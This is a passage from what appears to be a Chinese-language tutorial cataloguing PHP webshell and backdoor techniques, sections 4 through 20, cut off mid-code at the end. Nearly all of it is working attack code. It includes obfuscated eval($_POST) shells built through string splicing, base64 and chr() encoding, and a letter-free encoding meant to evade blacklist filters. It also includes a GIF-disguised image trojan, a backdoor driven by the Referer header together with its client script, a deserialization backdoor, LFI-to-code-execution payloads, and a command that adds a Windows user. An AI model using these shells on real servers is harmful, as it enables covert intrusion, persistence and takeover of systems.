<h3 id="4-利用PHP动态变量特性"><a href="#4-利用PHP动态变量特性" class="headerlink" title="4. 利用PHP动态变量特性"></a>4. 利用PHP动态变量特性</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //@eval($_POST[&#x27;op&#x27;]);</span><br><span class="line">    @eval($&#123;&quot;_P&quot;.&quot;OST&quot;&#125;[&#x27;op&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//使用注释符来规避基于黑名单的正则</span><br><span class="line">&lt;?php</span><br><span class="line">    //@eval($_POST[&#x27;op&#x27;]);</span><br><span class="line">    @eval($/*aaa*/&#123;&quot;_P&quot;.&quot;OST&quot;&#125;[&#x27;op&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">// 使用$_REQUEST、$GLOBALS[&quot;_POST&quot;]、$_FILES等来获取数据，$_REQUEST 中的变量通过 GET，POST 和 COOKIE 输入机制传递给脚本文件</span><br><span class="line">&lt;?php</span><br><span class="line">    @eval($_REQUEST[&#x27;op&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    @eval($GLOBALS[&#x27;_POST&#x27;][&#x27;op&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    @eval($_FILES[&#x27;name&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">(再把payload写在文件名中)</span><br></pre></td></tr></table></figure>

<h3 id="5-tiny-php-shell"><a href="#5-tiny-php-shell" class="headerlink" title="5. tiny php shell"></a>5. tiny php shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">需目标服务器php.ini开启如下配置：</span><br><span class="line">short_open_tag = On</span><br><span class="line"></span><br><span class="line">&lt;?=($_=@$_GET[2]).@$_($_GET[1])?&gt;</span><br><span class="line"></span><br><span class="line">http://localhost/shell/webshell.php?2=system&amp;1=dir </span><br></pre></td></tr></table></figure>

<h3 id="6-无字母-webshell"><a href="#6-无字母-webshell" class="headerlink" title="6. 无字母 webshell"></a>6. 无字母 webshell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=&quot;&quot;;</span><br><span class="line">$_[+$_]++;</span><br><span class="line">$_=$_.&quot;&quot;;</span><br><span class="line">$___=$_[+&quot;&quot;];//A</span><br><span class="line">$____=$___;</span><br><span class="line">$____++;//B</span><br><span class="line">$_____=$____;</span><br><span class="line">$_____++;//C</span><br><span class="line">$______=$_____;</span><br><span class="line">$______++;//D</span><br><span class="line">$_______=$______;</span><br><span class="line">$_______++;//E</span><br><span class="line">$________=$_______;</span><br><span class="line">$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;//O</span><br><span class="line">$_________=$________;</span><br><span class="line">$_________++;$_________++;$_________++;$_________++;//S</span><br><span class="line">$_=$____.$___.$_________.$_______.&#x27;6&#x27;.&#x27;4&#x27;.&#x27;_&#x27;.$______.$_______.$_____.$________.$______.$_______;</span><br><span class="line">$________++;$________++;$________++;//R</span><br><span class="line">$_____=$_________;</span><br><span class="line">$_____++;//T</span><br><span class="line">$__=$___.$_________.$_________.$_______.$________.$_____;</span><br><span class="line">$__($_(&quot;ZXZhbCgkX1BPU1RbMV0p&quot;));   </span><br><span class="line">//ASSERT(BASE64_DECODE(&quot;ZXZhbCgkX1BPU1RbMV0p&quot;));</span><br><span class="line">//ASSERT(&quot;eval($_POST[1])&quot;);</span><br><span class="line">//key:=1</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="7-图片木马"><a href="#7-图片木马" class="headerlink" title="7. 图片木马"></a>7. 图片木马</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">webshell.php:</span><br><span class="line">&lt;?php</span><br><span class="line">    $wp__theme_icon=create_function(&#x27;&#x27;,file_get_contents(&#x27;/hack.gif&#x27;));</span><br><span class="line">    $wp__theme_icon();</span><br><span class="line">?&gt;</span><br><span class="line">hack.gif:</span><br><span class="line">phpinfo();</span><br><span class="line"></span><br><span class="line">这是图片木马的利用方式的一种，但是这种方不能像include那样有兼容性，include的情况是允许include进来的语句有错误，PHP会忽略这些错误，而去执行include进来的有效PHP代码</span><br><span class="line">string create_function ( string $args , string $code )</span><br><span class="line"></span><br><span class="line">而create_function(&#x27;&#x27;,file_get_contents(&#x27;/hack.gif&#x27;)); 这种方法不允许图片中有非法数据(真实的图片数据)，否则就会出现解析错误，所以攻击者只能把纯的木马脚本保存成图片格式，这样就可能导致无法绕过图片上传防御机制 </span><br></pre></td></tr></table></figure>

<p><strong>注意</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. short_open_tag = On</span><br><span class="line">由于jpg、gif等格式的图片中，出现&lt;?字符的频率很高，很容易造成PHP解析错误</span><br><span class="line"></span><br><span class="line">2. short_open_tag = Off</span><br><span class="line">这种情况下，图片WEBSHELL的运行较稳定，攻击者插入的&lt;?php ?&gt;能够得到稳定的执行</span><br></pre></td></tr></table></figure>

<h3 id="8-字符串拼接-PHP动态函数执行"><a href="#8-字符串拼接-PHP动态函数执行" class="headerlink" title="8. 字符串拼接+PHP动态函数执行"></a>8. 字符串拼接+PHP动态函数执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 用于动态执行的字符串必须是&quot;assert&quot;，不能是&quot;eval&quot;，因为在PHP中，eval不是函数，而assert是函数</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    $char_as=&#x27;as&#x27;;</span><br><span class="line">    $char_e=&#x27;e&#x27;;</span><br><span class="line">    $char_assert=$char_as.&#x27;s&#x27;.$char_e.&#x27;r&#x27;.&#x27;t&#x27;;</span><br><span class="line">    $char_base64_decode=&#x27;b&#x27;.$char_as.$char_e.(64).&#x27;_&#x27;.&#x27;d&#x27;.$char_e.&#x27;c&#x27;.&#x27;o&#x27;.&#x27;d&#x27;.$char_e;</span><br><span class="line">    @$char_assert(@$char_base64_decode(&#x27;ZXZhbCgkX1BPU1RbMTIzXSkK&#x27;));</span><br><span class="line">    //ZXZhbCgkX1BPU1RbMTIzXSkK: &quot;eval($_POST[123])&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="9-Curly-Syntax"><a href="#9-Curly-Syntax" class="headerlink" title="9. Curly Syntax"></a>9. Curly Syntax</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $k = &quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">   $xsser = $_GET[&quot;op&quot;]; </span><br><span class="line">   @eval(&quot;\$safedg = $xsser;&quot;) </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">http://localhost/shell/index.php?op=$&#123;$&#123;fputs(fopen(&quot;webshell.php&quot;, &quot;w+&quot;), &quot;&lt;?php eval(\$_POST[1]);?&gt;webshell&quot;)&#125;&#125;;</span><br><span class="line"></span><br><span class="line">// 当应用系统的输入点存在注入点，并且这个输入能够到达代码的某个变量赋值的代码流位置，攻击者可以利用这次&quot;变量赋值&quot;进行一次&quot;代码执行&quot;</span><br></pre></td></tr></table></figure>

<p>curl语法代码执行是不能带回显，不能作为一个webshell指令执行跳板来使用，而只能作为”一次性代码执行且不需要回显”的场景，即向本地磁盘写一个新的webshell文件</p>
<h3 id="10-LFI导致的代码执行"><a href="#10-LFI导致的代码执行" class="headerlink" title="10. LFI导致的代码执行"></a>10. LFI导致的代码执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $to_include = $_GET[&#x27;file&#x27;];</span><br><span class="line">    require_once($to_include);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">eval(file_get_contents(&#x27;php://input&#x27;)); </span><br><span class="line"></span><br><span class="line">// 这种LFI可能导致攻击者将文件包含漏洞升级为代码执行漏洞</span><br><span class="line">http://localhost/shell/index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="11-PHP动态创建匿名函数-Lamda表达式"><a href="#11-PHP动态创建匿名函数-Lamda表达式" class="headerlink" title="11. PHP动态创建匿名函数(Lamda表达式)"></a>11. PHP动态创建匿名函数(Lamda表达式)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// 利用动态变量直接动态执行函数，PHP允许使用create_function动态的进行&quot;匿名函数(Lamda)&quot;的创建、</span><br><span class="line"></span><br><span class="line">string create_function ( string $args , string $code )</span><br><span class="line">&lt;?php</span><br><span class="line">    $foobar = $_GET[&#x27;foobar&#x27;];</span><br><span class="line">    $dyn_func = create_function(&#x27;$foobar&#x27;, &quot;echo $foobar;&quot;);</span><br><span class="line">    $dyn_func(&#x27;&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">http://localhost/shell/index.php?foobar=system(&#x27;dir&#x27;)</span><br><span class="line">http://localhost/shell/index.php?foobar=eval(&#x27;phpinfo();&#x27;)</span><br><span class="line">http://localhost/test/test.php?foobar=eval(&quot;$_POST[1]&quot;) </span><br><span class="line"></span><br><span class="line">动态函数的另一种写法：</span><br><span class="line">&lt;?php</span><br><span class="line">    eval(&quot;function lambda_n() &#123; echo system(&#x27;dir&#x27;); &#125;&quot;);</span><br><span class="line">    lambda_n();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    eval(&quot;function lambda_n() &#123; eval($_GET[1]); &#125;&quot;);</span><br><span class="line">    lambda_n();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">http://localhost/shell/index.php?1=phpinfo()</span><br><span class="line"></span><br><span class="line">&lt;?php    </span><br><span class="line">    eval(&#x27;function lambda_n() &#123; eval($_POST[1]); &#125;&#x27;);    </span><br><span class="line">    lambda_n();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">// 在PHP内部 create_function() 只是对 eval()的一层封装，最终还是使用eval()进行代码执行</span><br></pre></td></tr></table></figure>

<p>create_function另一种形式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gif89a</span><br><span class="line">&lt;?php</span><br><span class="line">    $_chr = chr(99).chr(104).chr(114); //chr  </span><br><span class="line">    $_eval_post_1 = $_chr(101).$_chr(118).$_chr(97).$_chr(108).$_chr(40).$_chr(36).$_chr(95).$_chr(80).$_chr(79).$_chr(83).$_chr(84).$_chr(91).$_chr(49).$_chr(93).$_chr(41).$_chr(59); //eval($_POST[1]); </span><br><span class="line">    $_create_function = $_chr(99).$_chr(114).$_chr(101).$_chr(97).$_chr(116).$_chr(101).$_chr(95).$_chr(102).$_chr(117).$_chr(110).$_chr(99).$_chr(116).$_chr(105).$_chr(111).$_chr(110); //create_function </span><br><span class="line"></span><br><span class="line">    $_= $_create_function(&quot;&quot;,$_eval_post_1); //die(var_dump($_create_function ));</span><br><span class="line">    @$_();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="12-利用系统输出缓存"><a href="#12-利用系统输出缓存" class="headerlink" title="12. 利用系统输出缓存"></a>12. 利用系统输出缓存</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $foobar = &#x27;system&#x27;;</span><br><span class="line">    ob_start($foobar);</span><br><span class="line">    echo &quot;dir c:&quot;;</span><br><span class="line">    ob_end_flush();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">// ob_start()会把接收到的字符串当作一个&quot;回调函数callback_func&quot;，并将接下来的缓冲区输入，当作这个&quot;回调函数&quot;的参数</span><br><span class="line"></span><br><span class="line">还可以重写ob_start方法</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">    ob_start(function ($c,$d)&#123;register_shutdown_function(&#x27;assert&#x27;,$c);&#125;); </span><br><span class="line">    echo $_REQUEST[&#x27;pass&#x27;]; </span><br><span class="line">    ob_end_flush(); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="13-利用assert-断言"><a href="#13-利用assert-断言" class="headerlink" title="13. 利用assert()断言"></a>13. 利用assert()断言</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $foobar = &#x27;system(&quot;dir&quot;)&#x27;;</span><br><span class="line">    assert($foobar);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">1. 断言这个功能应该只被用来调试</span><br><span class="line">2. 应该用于完整性检查时测试条件是否始终应该为 TRUE</span><br><span class="line">3. 来指示某些程序错误</span><br><span class="line">4. 或者检查具体功能的存在(类似扩展函数或特定的系统限制和功能)</span><br></pre></td></tr></table></figure>

<h3 id="14-数组映射类型函数处理后的回调机制"><a href="#14-数组映射类型函数处理后的回调机制" class="headerlink" title="14. 数组映射类型函数处理后的回调机制"></a>14. 数组映射类型函数处理后的回调机制</h3><p>array_map — 将回调函数作用到给定数组的单元上，可以利用array_map的这个特点，将第一个参数(回调函数)作为命令执行管道，第二个参数(callback参数)作为payload传入，从而构将传统的函数调用(payload)的模式转换为array_map(指令执行，payload)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $new_array = array_map(&quot;ass\x65rt&quot;, (array)$_REQUEST[&#x27;op&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//http://localhost/test/test.php?op=eval($_GET[1]): 菜刀密码: 1</span><br></pre></td></tr></table></figure>

<h3 id="15-PHP序列化-x2F-反序列化特性布置后门"><a href="#15-PHP序列化-x2F-反序列化特性布置后门" class="headerlink" title="15. PHP序列化&#x2F;反序列化特性布置后门"></a>15. PHP序列化&#x2F;反序列化特性布置后门</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class Example</span><br><span class="line">    &#123;</span><br><span class="line">       var $var = &#x27;&#x27;;</span><br><span class="line">       function __destruct()</span><br><span class="line">       &#123;</span><br><span class="line">          eval($this-&gt;var);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //$exp =  new Example();</span><br><span class="line">    //$exp-&gt;var = &quot;phpinfo();&quot;;</span><br><span class="line">    //die(serialize($exp));</span><br><span class="line">    unserialize($_GET[&#x27;saved_code&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">O:7:&quot;Example&quot;:1:&#123;s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;&#125;  </span><br><span class="line">http://localhost/shell/index.php?saved_code=O:7:&quot;Example&quot;:1:&#123;s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;&#125;  </span><br><span class="line"></span><br><span class="line">// 原理: 被序列化的对象在反序列化的时候会自动调用它的析构函数</span><br></pre></td></tr></table></figure>

<h3 id="16-使用HTTP头部字段进行指令传输"><a href="#16-使用HTTP头部字段进行指令传输" class="headerlink" title="16. 使用HTTP头部字段进行指令传输"></a>16. 使用HTTP头部字段进行指令传输</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">通过HTTP请求中的HTTP_REFERER来运行经过base64编码的代码，来达到后门的效果。</span><br><span class="line"></span><br><span class="line">backdoor:</span><br><span class="line">&lt;?php</span><br><span class="line">    header(&#x27;Content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">    //将$_SERVER[&#x27;HTTP_REFERER&#x27;]中的参数解析到本地变量中，放到$a数组中</span><br><span class="line">    parse_str($_SERVER[&#x27;HTTP_REFERER&#x27;], $a);</span><br><span class="line">    //判断数组变量$a中的第一个元素是否是&quot;10&quot;、并且数组元素个数是否是9个</span><br><span class="line">    if(reset($a) == &#x27;10&#x27; &amp;&amp; count($a) == 9)</span><br><span class="line">    &#123;    </span><br><span class="line">        //取出数组$a中索引6的元素，即我们传入的实际payload，并进行base64_decode解码</span><br><span class="line">        eval(base64_decode(str_replace(&quot; &quot;, &quot;+&quot;, implode(array_slice($a, 6)))));</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">利用方式:</span><br><span class="line">&lt;?php</span><br><span class="line">    header(&#x27;Content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">    //要执行的代码</span><br><span class="line">    $code = &quot;phpinfo();&quot;;</span><br><span class="line">    //进行base64编码</span><br><span class="line">    $code = base64_encode($code);</span><br><span class="line">    //构造referer字符串</span><br><span class="line">    $referer = &quot;a=10&amp;b=ab&amp;c=34&amp;d=re&amp;e=32&amp;f=km&amp;g=&#123;$code&#125;&amp;h=&amp;i=&quot;;</span><br><span class="line">    //后门url</span><br><span class="line">    $url = &#x27;http://localhost/shell/index.php&#x27;;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    $options = array(</span><br><span class="line">        CURLOPT_URL =&gt; $url,</span><br><span class="line">        CURLOPT_HEADER =&gt; FALSE,</span><br><span class="line">        CURLOPT_RETURNTRANSFER =&gt; TRUE,</span><br><span class="line">        CURLOPT_REFERER =&gt; $referer</span><br><span class="line">    );</span><br><span class="line">    curl_setopt_array($ch, $options);</span><br><span class="line">    echo curl_exec($ch);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">// 这个webshell通过编码的referer来传递攻击载荷，HTTP通信的头部的任何字段、或者HTTP的数据部分的任何字段都可以当作webshell的payload来传递数据</span><br></pre></td></tr></table></figure>

<h3 id="17-乱序拼接法"><a href="#17-乱序拼接法" class="headerlink" title="17. 乱序拼接法"></a>17. 乱序拼接法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    @$_=&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;;  </span><br><span class="line">    @$_=&quot;a&quot;.$_.&quot;t&quot;;  </span><br><span class="line">    @$_($&#123;&quot;_P&quot;.&quot;OS&quot;.&quot;T&quot;&#125;[1-2-5]);</span><br><span class="line">?&gt;  </span><br><span class="line"></span><br><span class="line">// 这里双层$&#123;&#125;的作用，里面那个$&#123;&#125;是为了让_POST[-6]被解析出来的，如果不用这个花括号，则这个&quot;_POST[]&quot;就变成一个纯文本了，加上这个$&#123;&#125;之后，变量原本的变量特性就表现出来，也就能正确传参</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    $aaaaa=&quot;sewtemznypianol&quot;;</span><br><span class="line">    $char_system=$aaaaa&#123;0&#125;.$aaaaa&#123;8&#125;.$aaaaa&#123;0&#125;.$aaaaa&#123;3&#125;.$aaaaa&#123;1&#125;.$aaaaa&#123;5&#125;;</span><br><span class="line">    //die($char_system);</span><br><span class="line">    $aaaaaa=&quot;edoced46esab_n&quot;;</span><br><span class="line">    $char_base64_decode=$aaaaaa&#123;11&#125;.$aaaaaa&#123;10&#125;.$aaaaaa&#123;9&#125;.$aaaaaa&#123;8&#125;.$aaaaaa&#123;7&#125;.$aaaaaa&#123;6&#125;.$aaaaaa&#123;12&#125;.$aaaaaa&#123;5&#125;.$aaaaaa&#123;4&#125;.$aaaaaa&#123;3&#125;.</span><br><span class="line">　　　$aaaaaa&#123;2&#125;.$aaaaaa&#123;1&#125;.$aaaaaa&#123;0&#125;;</span><br><span class="line">    die($char_base64_decode);</span><br><span class="line">    echo $char_system($char_base64_decode(&quot;aXBjb25maWc=&quot;));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">这种webshell的编写思路很巧妙，和&quot;乱序插入&quot;不是一个做法</span><br><span class="line"></span><br><span class="line">1) &quot;乱序插入&quot;是在一段正常的webshell代码中随机插入一些杂乱的无意义的字母，然后再在下面使用preg_replace之类的正则替换来去除掉这些&quot;混淆盐字母&quot;，以还原出原有的正常的webshell代码</span><br><span class="line"></span><br><span class="line">2) 这种做法先定义一个&quot;字母池&quot;，这个&quot;字母池&quot;包含有我们需要构造的关键函数的字符。我们通过从这个字母池中选取特定的索引下的字母，以此来构造出我们想要的&quot;动态函数&quot;(system、base64_decode)</span><br></pre></td></tr></table></figure>

<h3 id="18-PHP管道技术利用"><a href="#18-PHP管道技术利用" class="headerlink" title="18. PHP管道技术利用"></a>18. PHP管道技术利用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    /*</span><br><span class="line">        PHP中如何增加一个系统用户</span><br><span class="line">        下面是一段例程，</span><br><span class="line">        用户名: test</span><br><span class="line">        密码是: 123</span><br><span class="line">    */</span><br><span class="line">    $command = &quot;net user&quot;;</span><br><span class="line">    $useradd = &quot;add &quot;;</span><br><span class="line">    $pwd = &quot;123&quot;;</span><br><span class="line">    $user = &quot;test&quot;;  </span><br><span class="line">    $user_add = sprintf(&quot;%s &quot;%s %s&quot;&quot;, $command, $useradd, $user, $pwd);</span><br><span class="line">    $fp = @popen($user_add,&quot;w&quot;);  </span><br><span class="line">    @pclose($fp);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">// 命令执行成功，添加账户成功。PHP执行命令有很多方法，eval、passthru、system、assert、popen、exec、shell_exec</span><br></pre></td></tr></table></figure>

<h3 id="19-PHP指令替换"><a href="#19-PHP指令替换" class="headerlink" title="19. PHP指令替换"></a>19. PHP指令替换</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line">    $cmd = `dir`;  </span><br><span class="line">    echo $cmd;   </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>

<h3 id="20-基于图片文件非可显示字段部署PHP木马"><a href="#20-基于图片文件非可显示字段部署PHP木马" class="headerlink" title="20. 基于图片文件非可显示字段部署PHP木马"></a>20. 基于图片文件非可显示字段部署PHP木马</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">Malware Hidden Inside JPG EXIF Headers: exif_read_data() 函数从 JPEG 或 TIFF 图像文件中读取 EXIF 头信息。这样就可以读取数码相机产生的元数据</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">   